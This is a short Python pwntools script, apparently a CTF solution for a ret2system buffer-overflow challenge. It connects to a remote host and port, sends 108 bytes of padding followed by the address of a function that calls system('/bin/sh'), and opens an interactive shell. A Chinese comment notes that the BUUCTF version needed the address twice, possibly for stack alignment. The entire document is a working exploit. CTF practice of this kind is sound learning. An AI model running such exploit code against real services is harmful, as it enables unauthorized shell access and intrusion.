# -*- coding:utf-8 -*-
# ret2system
from pwn import *

sh = remote("182.92.187.213",26442)
# sh = process('./pwn')
junk = 'a' * (100 + 8)
syscall = 0x0804890F
payload = flat(junk, syscall)
# payload = flat(junk, p64(syscall), p64(syscall)) # buuctf这题需要2个，不明白。好像是栈没对齐的原因
sh.sendline(payload)
sh.interactive()

# int sub_0804890F() {return system("/bin/sh"); }
